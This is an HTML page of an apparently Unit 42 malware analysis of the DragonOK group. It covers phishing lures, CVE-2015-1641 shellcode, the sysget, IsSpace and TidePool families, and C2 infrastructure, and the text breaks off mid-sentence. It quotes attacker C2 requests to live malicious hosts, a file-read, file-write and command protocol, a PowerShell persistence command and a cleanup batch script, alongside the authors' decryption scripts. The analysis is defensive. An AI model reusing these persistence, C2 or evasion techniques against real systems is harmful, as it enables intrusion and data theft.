
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>DragonOK Updates Toolset and Targets Multiple Geographic Regions</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="DragonOK Updates Toolset and Targets Multiple Geographic Regions" />
<meta property="og:description" content="This post is also available in: 日本語 (Japanese)The DragonOK group has been actively launching attacks for years. We first discussed them in April 2015 when we witnessed them targeting a number of organizations in Japan. In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants..." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="DragonOK" />
<meta property="article:tag" content="Japan" />
<meta property="article:tag" content="threat intelligence" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-01-05T06:00:46+00:00" />
<meta property="article:modified_time" content="2018-11-01T10:42:35+00:00" />
<meta property="og:updated_time" content="2018-11-01T10:42:35+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="This post is also available in: 日本語 (Japanese)The DragonOK group has been actively launching attacks for years. We first discussed them in April 2015 when we witnessed them targeting a number of organizations in Japan. In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants..." />
<meta name="twitter:title" content="DragonOK Updates Toolset and Targets Multiple Geographic Regions" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; DragonOK Updates Toolset and Targets Multiple Geographic Regions Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/feed/" />
<meta property="og:likes" content="0"/>
<meta property="og:readtime" content="15"/>
<meta property="og:views" content="26,282"/>
<meta property="og:date_created" content="January 5, 2017 at 8:00 AM"/>
<meta property="og:post_length" content="5605"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Josh Grunzweig"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/joshgruznweig/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"DragonOK Updates Toolset and Targets Multiple Geographic Regions","name":"DragonOK Updates Toolset and Targets Multiple Geographic Regions","description":"This post is also available in: \u65e5\u672c\u8a9e (Japanese)The DragonOK group has been actively launching attacks for years. We first discussed them in April 2015 when we witnessed them targeting a number of organizations in Japan. In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants...","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions\/","datePublished":"January 5, 2017","articleBody":"The DragonOK group has been actively launching attacks for years. We first discussed them in April 2015 when we witnessed them targeting a number of organizations in Japan. In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants of the previously discussed sysget malware family have been observed in use by DragonOK. Sysget malware was delivered both directly via phishing emails, as well as in Rich Text Format (RTF) documents exploiting the CVE-2015-1641 vulnerability (patched in MS15-033) that in turn leveraged a very unique shellcode. Additionally, we have observed instances of the IsSpace and TidePool malware families being delivered via the same techniques. While Japan is still the most heavily targeted geographic region by this particular actor, we also observed instances where individuals or organizations in Taiwan, Tibet, and Russia also may have been targeted.\nInfiltration\nWe observed two unique techniques of infiltration for this particular campaign:\n\n \tPhishing emails being sent with malicious executables directly attached\n \tMalicious RTF files which exploit CVE-2015-1641.\n\nThe phishing emails had the following characteristics:\n\nEmail Subjects\n\n \tPickup at the Juanda Airport (1-Sep)\n \t\u30dd\u30a4\u30f3\u30c8\u30d7\u30ec\u30bc\u30f3\u30c8\u306e\u304a\u77e5\u3089\u305b [Roughly Translated: Point gift announcement]\n \t20\u5468\u5e74\u8a18\u5ff5\u30d1\u30fc\u30c6\u30a3\u30fc [Roughly Translated: 20th Anniversary Party]\n \t\u53c2\u52a0\u8005\u306e10\u5468\u5e74\u8a18\u5ff5\u540c\u7a93\u4f1a\u4e00\u89a7 [Roughly Translated: List of participants' 10th anniversary alumni association]\n \t\u5b50\u4f9b\u306e\u8abf\u67fb\u9023\u308c [Roughly Translated: Children's investigation]\n \tG20 report\n \t\u8a18\u5ff5\u65e5\u306e\u518d\u4f1a [Roughly Translated: Anniversary reunion]\n \t\u6700\u65b0\u306e\u4eba\u4e8b\u7570\u52d5\u901a\u77e5 [Roughly Translated: Recent personnel change notice]\n\nAttachment Filenames\n\n \tG20 report.exe\n \texe\n \tList of Participants.exe\n \tRegistration form.exe\n\nThese emails targeted the following industries in Japan:\n\n \tManufacturing\n \tHigher Education\n \tEnergy\n \tTechnology\n \tSemiconductor\n\nThe malicious RTF files in question leverage a very specific shellcode to drop and execute the malicious payload, as well as a decoy document. Decoy documents are legitimate benign documents that are opened after the malicious payload is delivered, thus ensuring that the victim does not become suspicious because their expected document opened as expected.\n\nTwo samples were found to include the decoy document show in Figure 1.\n\nThe title of the document roughly translates to \u201cMinistry of Communications &amp; Departments Authorities Empty Sites and Hosted Public Works Source Clearance Photos\u201d. The use of traditional Chinese indicators the target likely residing in either Taiwan, Hong Kong, or Macau. However, based on the Taiwanese subject matter in this document, we can safely come to the conclusion that the intended victim was of Taiwanese origin. These samples delivered an updated version of the IsSpace malware family, which was discussed previously in a watering hole attack targeting an aerospace firm. IsSpace is an evolved variant of the NFlog backdoor, which has been used by DragonOK in the past.\n\n\n\nFigure 1 Taiwanese decoy document\n\nTwo other samples were identified that used a Tibet-themed decoy document. The document in question (Figure 2) appears to be an internal newsletter from the Central Tibetan Ministry, as suggested by the logo used as well as the content of the document itself.\u00a0 This document indicates that the malware may have been targeted towards an individual that is interested in Tibetan affairs. These particular samples were unique in that they delivered the TidePool malware family that we reported on in May of 2016. We have not previously observed DragonOK using TidePool in attacks.\n\n\n\nFigure 2 Tibetan decoy document containing internal newsletter\n\nWe also identified an additional sample using decoy targeting Taiwanese victims (Figure 3), which deployed a newer sysget sample.\n\n\n\nFigure 3 Taiwanese-targeted decoy document\n\nOther new samples associated with this group used a Russian language decoy document (Figure 4.) The decoy document in question discusses the GOST block cipher, which was created by the Russian government in the 1970\u2019s. The combination of Russian language and Russian-specific subject matter indicates that the intended victim speaks Russian and may be interested in encryption. Like the previously discussed Tibetan decoy documents, these samples also delivered the TidePool malware family.\n\n\n\nFigure 4 Russian decoy document discussing the GOST block cipher\n\nFinally, multiple samples used a traditional Chinese language decoy document that discussed a subsidy welfare adjustment program. The use of traditional Chinese indicators the target likely residing in either Taiwan, Hong Kong, or Macau. Similar to other attacks witnessed, a variant of the sysget malware family is installed by these files.\n\n\n\nFigure 5 Decoy document discussing subsidy welfare adjustment program\nMalware Deployed\nIn looking at the various malware samples used in attempted attacks, the following four families were identified:\n\n \tSysget version 2\n \tSysget version 3\n \tTidePool\n \tIsSpace\n\nWe broke the sysget classification into multiple variants when we found that a number of changes have been made since our April 2015 report. Major distinctions between the versions of sysget include the following:\n\nSysget version 2\n\n \tRemoved support for persistence on Windows XP\n \tReworked the URIs used for network communication\n \tAdded additional layers of encryption for network communication and stored configuration files\n \tSwitched from RC4 to AES-128\n\nSysget version 3\n\n \tNumerous anti-debug and anti-vm procedures added\n \tEncrypted URIs in network communication with an initial static key\n\nIn addition, we observed a sysget version 4 that was discovered in another sample during our research. This version is not attributed to a specific attack against an organization.\n\nIndicators of compromise related to sysget version 4 and other samples not directly attributed to specific attacks may be found in the Appendix of this blog post.\u00a0 Additionally, more information about the various sysget variants may also be found in the Appendix.\n\nThe TidePool samples encountered are consistent with the samples previously discussed. I encourage readers to view our previous blog post to learn more about the intricacies of this particular malware family.\n\nThe IsSpace malware sample, however, looks to have been updated since last we wrote on it. While the available commands from the command and control (C2) server remains the same, the URI structure of the network communication has been modified. Additionally, the installation routine for this malware family has been updated to be far less complex than previous discussed versions, favoring PowerShell to set persistence and forgoing the previously used side-loading technique. A more detailed analysis of the new instances of IsSpace may be found at the end of this blog post in the Appendix.\nInfrastructure\nA number of unique domains were employed by the various Trojans used in these attacks. For the numerous instances of sysget we observed, the following domains were observed for their C2:\n\n \tkr44.78host[.]com\n \tgtoimage[.]com\n \tgogolekr[.]com\n\nAll of the above domains have Chinese WHOIS registrant details. Additionally, the gotoimage[.]com and trend.gogolekr[.]com are both registered to the same registrant and resolve to the same netblock of 104.202.173.0\/24.\n\nThe instances of TidePool identified communicated with the following C2 servers:\n\n \teurope.wikaba[.]com\n \trussiaboy.ssl443[.]org\n \tcool.skywave[.]top\n\nThese domains did not have many definitive relations with the sysget C2 servers except for cool.skywave[.]top, which shared a unique registrant email with the sysget C2 server of trend.gogolekr[.]com. Additionally, the geographic region of the resolved IPs was consistent with the previous set, as they all resolved to various regions in southeast Asia. Specifically, the domains resolved to China, Korea, and Taiwan in the past six months.\n\nThe IsSpace samples resolved to the following domains:\n\n \twww.dppline[.]org\n \twww.matrens[.]top\n\nThese domains had no apparent connections to the previously discussed C2 servers, other than the fact that they resolved to Korea and Hong Kong respectively. Additionally, the registrar of \u2018Jiangsu Bangning Science and technology Co. Ltd.\u2019 was used for a large number of domains. A full graph of the relations between the various attacks is shown in Figure 6.\n\n\n\nFigure 6 Relationships between attacks\nConclusion\nThe DragonOK group are quite active and continue updating their tools and tactics. Their toolset is being actively developed to make detection and analysis more difficult. Additionally, they appear to be using additional malware toolsets such as TidePool. While Japan is still the most-targeted region by this group, they look to be seeking out victims in other regions as well, such as Taiwan, Tibet, and Russia.\n\nPalo Alto Network customers are protected against this threat in the following ways:\n\n \tMalware families are tagged in AutoFocus via a variety of tags (TidePool, NFlog, Sysget)\n \tThe following IPS signatures detect malicious network traffic:\n\n \tIPS signature 14365 (IsSpace.Gen Command And Control Traffic)\n \tIPS signature 14588 (Suspicious.Gen Command And Control Traffic)\n \tIPS signature 13574 (NfLog.Gen Command And Control Traffic)\n \tIPS signature 13359 (Nflog.Gen Command And Control Traffic)\n\n\n \tAll samples are appropriately marked malicious in WildFire\n\nAppendix\nCVE-2015-1641 Exploit and Shellcode\n\nThis particular group uses a very specific shellcode payload when exploiting CVE-2015-1641. This CVE is memory corruption vulnerability which allows for arbitrary code execution in various versions of Microsoft Office, including 2007, 2010, and 2013.\n\nThe shellcode begins by dynamically loading a small number of API functions from kernel32. A number of hashes are included that represent function names, which have a rotate right 7 (ROR7) operation applied against them before being XORed against a key of \u201c\\x10\\xAD\\xBE\\xEF\u201d. The ROR7 operation is a very common technique in shellcode to obfuscate what functions are being called. The author added the XOR operation to add another layer of obfuscation.\n\n\n\nFigure 7 API function hashes contained in shellcode\n\nAfter the shellcode loads the necessary API functions, it proceeds to seek out a number of markers that will mark the beginning and ending of both an embedded malicious payload, as well as a decoy document.\n\nThe malicious executable is marked with a starting point of 0xBABABABABABA and an end marker of 0xBBBBBBBB. The decoy document is found immediately after the end of the malicious payload, and has an end marker of 0xBCBCBCBC. Both executables are encrypted with a 4-byte XOR key. Should the original data contain 0x00000000, it will not have the XOR applied against it.\n\nThe malicious payload is XORed against a key of 0xCAFEBEEF and the decoy document is XORed against 0xBAADF00D. The following script may be applied against the RTF document to extract both the malicious payload and the decoy:\nimport sys, binascii\nfrom itertools import cycle, izip\nimport re\n\ndef xor(message, key):\n  return ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))\n\n\ndef decrypt(data, key):\n  output = \"\"\n  iteration = 4\n  position = 0\n  while True:\n    window = data[position:position+iteration]\n    if window == \"\\x00\\x00\\x00\\x00\":\n      output += window\n    else:\n      output += xor(window, key)\n    position += iteration\n    if position == len(data) or position &gt; len(data):\n      break\n  return output\n\n\ndef extract(data):\n  exe_data, doc_data = None, None\n  exe_starting_point = data.index(\"\\xBA\\xBA\\xBA\\xBA\\xBA\\xBA\") + 6\n  exe_ending_point = None\n  ending_points = [m.start() for m in re.finditer(\"\\xBB\\xBB\\xBB\\xBB\", data)]\n  for e in ending_points:\n    if e &gt; exe_starting_point:\n      exe_ending_point = e\n  if exe_starting_point and exe_ending_point:\n    mz_data = data[exe_starting_point:exe_ending_point]\n    exe_data = decrypt(mz_data, \"\\xBE\\xBA\\xFE\\xCA\")\n  else:\n    raise Exception(\"Unable to find correct offsets for executable.\")\n\n  doc_starting_point = exe_ending_point + 4\n  doc_ending_point = None\n  ending_points = [m.start() for m in re.finditer(\"\\xBC\\xBC\\xBC\\xBC\", data)]\n  for e in ending_points:\n    if e &gt; doc_starting_point:\n      doc_ending_point = e\n  if doc_starting_point and doc_ending_point:\n    doc = data[doc_starting_point:doc_ending_point]\n    doc_data = decrypt(doc, \"\\x0D\\xF0\\xAD\\xBA\")\n  else:\n    raise Exception(\"Unable to find correct offsets for document.\")\n  return [exe_data, doc_data]\n\n\ndef main():\n  input_file = sys.argv[1]\n  input_fh = open(input_file, 'rb')\n  input_data = input_fh.read()\n  input_fh.close()\n  exe, doc = extract(input_data)\n\n  filename = \"{}.exe\".format(input_file)\n  output_file = open(filename, 'wb')\n  output_file.write(exe)\n  output_file.close()\n  print \"[+] Wrote {}\".format(filename)\n\n  filename = \"{}.doc\".format(input_file)\n  output_file = open(filename, 'wb')\n  output_file.write(doc)\n  output_file.close()\n  print \"[+] Wrote {}\".format(filename)\n\n\nif len(sys.argv) == 2 and __name__ == \"__main__\":\n  main()\n\nWhen both files are decrypted, they are written to the following location in the %TEMP% directory:\n\n \t..\/..exe\n \t..\/..doc\n\nNote the initial \u2018..\u2019, which represents the parent directory of %TEMP%. This coupled with the unusual names of ..exe and ..doc make this particular shellcode very unique, which is one way we have attributed these samples to the same group. After the samples have been written, they are executed via calls to WinExec.\nSysget v2 Analysis\nOne of the fundamental changes witnessed in the second iteration of sysget is removing support for Windows XP and lower. Other changes include modifications to the URIs used for network communication.\n\nLike the original version of sysget, sysget v2 still uses a named event of \u2018mcsong[]\u2019 to ensure a single instance is running at a time. It proceeds to make attempts at copying itself to the %STARTUP%\/notilv.exe path. However, it uses COM objects to perform this action that is not available in Windows XP, which prevents the malware from installing itself to this location. While the remainder of the malware operates as expected, it will not survive a restart of the system.\n\nSysget proceeds to make an attempt at reading the following configuration file. This filename and path has changed since the original version, and is consistent in the subsequent versions.\n\n \t%APPDATA%\/vklCen5.tmp\n\nThis configuration file holds both a unique victim identifier, as well as a key that is used to encrypt HTTP traffic. It is encrypted using the AES-128 encryption algorithm, using a static key of \u2018734thfg9ih\u2019. Using AES-128 is a change from the previous version, where RC4 was used for all encryption operations. The following Python code may be used to decrypt this file:\nimport sys\nimport base64\nfrom wincrypto import CryptCreateHash, CryptHashData, CryptDeriveKey, CryptDecrypt\n\ndef decrypt(data, original_key):\n\tCALG_AES_128 = 0x660E\n\tCALG_MD5 = 0x8003\n\tmd5_hasher = CryptCreateHash(CALG_MD5)\n\tCryptHashData(md5_hasher, original_key)\n\tkey = CryptDeriveKey(md5_hasher, CALG_AES_128)\n\tdecrypted_data = CryptDecrypt(key, data)\n\treturn decrypted_data\n\narg = open(sys.argv[1], 'rb').read()\nprint repr(decrypt(arg, '734thfg9ih'))\n\nWhen executed against an example configuration file, we see the following output, which includes the two pieces of data noted previously:\nC:\\&gt;python decrypt_config.py vklCen5.tmp\n'gh1443717133\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x001059086204\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\nx00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n\nThe encryption of this configuration file is a new feature that was not present in the original version of sysget.\n\nIf this file is not present on the system, the malware will attempt to retrieve the necessary information via a HTTP request. The following request is made to the remote command and control server. Note that the full URI is statically set by the malware sample.\nGET \/index.php?type=read&amp;id=1420efbd80ce02328663631c8d8f813c&amp;pageinfo=jp&amp;lang=\nutf-8 HTTP\/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla\/5.0 (Windows NT 5.1) AppleWebKit\/537.36 (KHTML, like \nGecko) Chrome\/40.0.2214.115 Safari\/537.36\nHost: hello.newtaiwan[.]top\nThe server responds with the following data, encrypted using the same technique previously described with a static key of \u2018aliado75496\u2019. Once decrypted, we see the following example data being sent back to sysget:\n\ngh1443717133\\n1059086204\\n\n\nThe first string is used as a key for all subsequent network communication. The second string is treated as a unique victim identifier. This data is encrypted using the key of \u2018734thfg9ih\u2019 and written to the %APPDATA%\/vklCen5.tmp file.\n\nAfter this information has been obtained, the malware proceeds to enter its command and control loop. An HTTP request such as the following is made to the remote server. Note that the \u2018mid\u2019 GET variable holds the MD5 hash of the previously obtained victim identifier. The remaining data in the URI is hardcoded.\nGET \/index.php?type=get&amp;pageinfo=bridge03443&amp;lang=jp&amp;mid=5717cb8fed2750a2ee9e8\n30a30716ed4 HTTP\/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla\/5.0 (Windows NT 5.1) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/40.0.2214.115 Safari\/537.36\nHost: hello.newtaiwan[.]top\n\nThe response is encrypted using the unique key that was obtained previously. Should the response contain \u2018Fatal error\u2019 unencrypted, no further actions are taken by the malware sample. Once decrypted, the response may have one of the following two choices, and their accompanying purpose. Alternatively, if a raw command is provided, the malware will execute it and return the results.\n\n\n\nCommand\nDescription\n\n\ngoto wrong \"[file_path]\";\\n\nRead a specific file and return its contents.\n\n\ngoto right \"[filename]\" \"[identifier]\"\nWrite a given file. The identifier is used to retrieve the file\u2019s contents in a subsequent HTTP request.\n\n\n\nWhen the \u2018goto wrong\u2019 request is made, a HTTP POST request is made to the following URI. In the following URI, the \u2018list\u2019 parameter contains the MD5 hash of the victim\u2019s identifier.\n\n\/index.php?type=register&amp;pageinfo=myid32987&amp;list=5717cb8fed2750a2ee9e830a3\n0716ed4\n\nThe contents of this POST request contains the victim\u2019s identifier, as well as the file\u2019s contents encrypted with the unique key. The first 50 bytes are reserved for the victim identifier, as shown below:\n0000016F  35 37 31 37 63 62 38 66  65 64 32 37 35 30 61 32 5717cb8f ed2750a2\n0000017F  65 65 39 65 38 33 30 61  33 30 37 31 36 65 64 34 ee9e830a 30716ed4\n0000018F  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........\n0000019F  00 00 4b 59 bc 53 53 99  2b 6f a7 b5 5a 85 c7 66 ..KY.SS. +o..Z..f\n\nOnce decrypted, the data contains both the filename, as well as the contents of that file.\ntest.txt\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[TRUNCATED]\\x\n00\\x00\\x00file contents\n\nIf the \u2018goto right\u2019 command is used, the malware will make a subsequent request to the following URI. The \u2018cache\u2019 variable holds the unique identifier that was provided in the \u2018goto right\u2019 command.\n\n\/index.php?type=goto&amp;pageinfo=myid47386&amp;cache=identifier\n\nOnce the file contents are obtained, they are written to the specified filename in the %STARTUP% folder.\n\nWhen a raw command is received, the malware will upload the results to the following URI via a POST request:\n\n\/index.php?type=register\n\nAn overview of the network communications exhibited by sysget version 2 can be seen in the figure below.\n\n\n\nFigure 8 Sysget version 2 command and control flow\nSysget v3 Analysis\nSome of the biggest changes witnessed in version 3 of sysget includes numerous anti-debug and anti-vm detections added, as well as the encryption of the URIs used for network communication.\n\nWhen the malware initially executes, it performs the following checks to ensure it is not being debugged and not running in a sandbox or virtualized environment.\n\nShould these checks return false, the malware proceeds to enter its installation routine. The malware originally copies itself to a temp file in the %TEMP% directory with a filename prefix of \u201800\u2019. It proceeds to append 4194304 bytes of randomly chosen data to the end of this file. The increased filesize may have been added by the author in an attempt to thwart sandboxes that impose filesize limits on what is saved and\/or processed. Finally, the malware copies the original file from the tmp path to the %STARTUP%\/winlogon.exe path using the same technique witnessed in version 2. Sysget then writes a batch script in the %TEMP% folder with the following contents, cleaning up the original files and spawning the newly written winlogon.exe executable:\n@echo off\n:t\ntimeout 1\nfor \/f %%i in ('tasklist \/FI \"IMAGENAME eq [original_executable_name]\" ^| find \/v \/c \"\"' ) do set YO=%%i\nif %%YO%%==4 goto :t\ndel \/F \"[original_executable_path]\"\ndel \/F \"[tmp_file]\"\nstart \/B cmd \/c \"[startup_winlogon.exe]\"\ndel \/F \"[self]\"\nexit\n\nAfter installation, sysget will attempt to read the same %APPDATA%\/vklCen5.tmp file as witnessed in the previous variant. A number of strings within the malware, including the \u2018734thfg9ih\u2019 key used to encrypt this file, have been obfuscated via a single-byte XOR of 0x5F.\n\nSimilar to previous versions, should this vklCen5.tmp file not be present on the victim machine, it will make an external HTTP request to retrieve the necessary information. The following request is made by the malware. Readers will notice that the URI has changed from previous versions in a number of ways. This version of sysget looks to always make requests to 1.php, which is hardcoded within the malware itself. Additionally, all HTTP URIs in this version of sysget are encrypted. The initial GET request made to retrieve the victim identifier and unique key is encrypted with a key of \u2018Cra%hello-12sW\u2019. The subsequent response containing this information is then decrypted using a key of \u2018aliado75496\u2019, which is consistent with previous versions.\nGET \n\/1.php?K+50lkzq7OtigRtWY7Z5DwkmxRhFd5n3UXyH+Flfa0S8f5h3nl6XBDMa6a3IbDiPQqW\nSwZh7lQRmIPLlC8Wmfr8cGv7raGEV160r73FJjnOfyJPLEKWAIyJnfPZhHdGapA6tfwfwj24TN\n4QbBrMJkVCLPPZoI4HNtdDEo6G3ujjyvkpWnGQnRBi6DzylNrMypV\/K6Ft32dsMmmO52q4IdQ== HTTP\/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla\/5.0 (Windows NT 5.1) AppleWebKit\/537.36 (KHTML, like \nGecko) Chrome\/40.0.2214.115 Safari\/537.36\nHost: gtoimage.com\n\nWhen the URI above is base64-decoded and subsequently decrypted, we see the following:\n\nindex.php?type=read&amp;id=692fdc3c7b2c310fc017e4af335b8dc8&amp;pageinfo=jp&amp;lang=utf-8\n\nThis URI is consistent with the previous sysget variant. It would seem the authors simply have added this layer of encryption to hinder efforts to block the malware via network-based detections.\n\nAfter this initial request to retrieve the victim identifier and unique key, sysget enters its command and control loop. This process is consistent with the previous version, but simply has the extra layer of encryption used for the URIs.\nSysget v4 Analysis\nThe fourth variant of sysget is nearly identical to the third variant. However, the main difference lies in the URIs used for network communication. In addition to the expected encryption of the URIs, this variant also mangles the base64 encoding that is performed afterwards. The following Python script may be used to de-obfuscate the base64 URI found in this variant:\nimport base64\n\n'''\nURI Request:\n\nGET \n\/5.php?62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0\nAMo+rT4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+\nBGFsc3wtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr\/77jW5JTLNI4aed\n99 HTTP\/1.1\nConnection: Keep-Alive\nUser-Agent: Mozilla\/5.0 (Windows NT 5.1) AppleWebKit\/537.36 (KHTML, \nlike Gecko) Chrome\/40.0.2214.115 Safari\/537.36\nHost: www.sanseitime.com\n'''\n\nuri_string = \n\"62H72xihwn4LqfdOqTV4W2AthjuOeCa2k0RUvE7CicXxN2MWFre2pqH8gIdMMJQbzS0AMo+rT\n4GGalhcebmCbjdrjZlyDhmUjE7QO5mIXZTAucGt3LeLXxOxGiV1G4zecHSPAX3AiAeR+BGFsc3\nwtMhOWzXfithXYeCKnjh1O7pXsYqyKqfl=HpVzs4YXZb=UQY=BNEnr\/77jW5JTLNI4aed99\"\n\nb64_string = \n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\/=\"\nprefix_int = int(uri_string[0:2])\nout = \"\"\n\nfor u in uri_string[2:]:\n\tind = b64_string.index(u) - prefix_int\n\tout += b64_string[ind]\n\ndecoded = base64.b64decode(out)\n\nAdditionally, the C2 URI changes in this variant, from 1.php to 5.php\nIsSpace Analysis\nWhen initially run, IsSpace will create a unique event to ensure a single instance of the malware is running at a given time. This event name appears to be unique per the sample, as multiple samples contained unique event names. The following event names have been observed in the samples that were analyzed:\n\n \te6al69MS5iP\n \tv485ILa3q5z\n\nIsSpace proceeds to iterate over the running processes on the system, seeking out the following two process substrings:\n\n \tuiSeAgnt\n \tavp.exe\n\nThe uiSeAgnt string may be related to Trend Micro\u2019s solutions, while avp.exe most likely is related to Kaspersky\u2019s anti-malware product.\n\nIn the event uiSeAgnt is identified, the malware will enter its installation routine if not already running as \u2018bfsuc.exe\u2019 and proceeds to exit afterwards. Should avp.exe be identified, the malware enters an infinite sleep loop until a mouse click occurs. After this takes place, the malware proceeds as normal.\n\nThe malware then determines if it is running under Windows XP. In the event that it is, it will make a HTTP GET request to www.bing.com, presumably to ensure network connectivity.\n\n\n\nFigure 9 IsSpace connecting to www.bing.com\n\nIf the malware is not running on Windows XP, it will attempt to obtain and decrypt any basic authentication credentials from Internet Explorer. This information is used in subsequent HTTP requests in the event a 407 (Proxy Authentication Required) or 401 (Unauthorized) response code is received during network communication.\n\nIsSpace will then enter its installation routine, where it will first copy itself to the %LOCALAPPDATA% folder with a name of \u2018bfsuc.exe\u2019.\u00a0 It then sets the proper registry key for persistence by executing the following PowerShell command:\nC:\\Windows\\system32\\cmd.exe \/C Powershell.exe New-ItemProperty -Path \nHKCU:SOFTWARE\\MICROSOFT\\Windows\\CurrentVersion\\Run -Name Identity -\nPropertyType String -Value c:\\users\\josh grunzweig\\appdata\\local\\bfsuc.exe \n-force\nThe malware then makes an initial HTTP POST request to the configured C2 server. It will make this request to the \u2018\/news\/Senmsip.asp\u2019 URI. The POST data is XORed against a key of \u201c\\x35\\x8E\\x9D\\x7A\u201d, which is consistent with previous versions of IsSpace and NFlog. Decrypted, the POST data reads \u201c01234567890\u201d. The C2 server in turn will respond with the victim\u2019s external IP address.\n\n\n\nFigure 10 Initial IsSpace beacon\n\nIsSpace then spawns two threads that will make HTTP requests to the following URIs:\n\n \t\/news\/Sennw.asp?rsv_info=[MAC_ADDRESS]\n \t\/news\/Sentire.asp?rsv_info=[MAC_ADDRESS]\n\nThe \u2018Sennw.asp\u2019 POST requests that are made contain collected victim information. They, like other information sent across the network, are encrypted using the previously mentioned 4-byte XOR key. When decrypted, we are provided with information such as the following:\n60-F8-1D-CC-2F-CF#%#172.16.95.1#%#172.16.95.186#%#WIN-\nLJLV2NKIOKP#%#Win7#%#English(US)#%#2016-12-20 \n16:27:12#%#Active#%#xp20160628#%#IsAdmins#%#False\n\nThe information, delimited via \u2018#%#\u2019, is as follows:\n\n\n\nValue\nDescription\n\n\n60-F8-1D-CC-2F-CF\nMAC address\n\n\n172.16.95.1\nExternal IP collected previously\n\n\n172.16.95.186\nInternal IP address\n\n\nWIN-LJLV2NKIOKP\nHostname\n\n\nWin7\nWindows version\n\n\nEnglish(US)\nLanguage\n\n\n2016-12-20 16:27:12\nTimestamp\n\n\nActive\nMalware status. May also be \u2018Sleep\u2019\n\n\nxp20160628\nPotential campaign identifier\n\n\nIsAdmins \/ False\nUser admin status\n\n\n\nThe malware is expected to return one of the following two responses to this HTTP request:\n\n \tActive\n \tSlient (Note the typo)\n\nIn the event the response of Slient is received, the malware will stop sending out HTTP requests to the \u2018Sentire.asp\u2019 URI. Conversely, if the malware is set to the \u2018Sleep\u2019 status and the \u2018Active\u2019 response is received, it will begin the \u2018Sentire.asp\u2019 requests once more.\n\nThe requests to \u2018Sentire.asp\u2019 act as the main C2 loop, requesting commands from the remote server. The commands are consistent with previously observed instances of 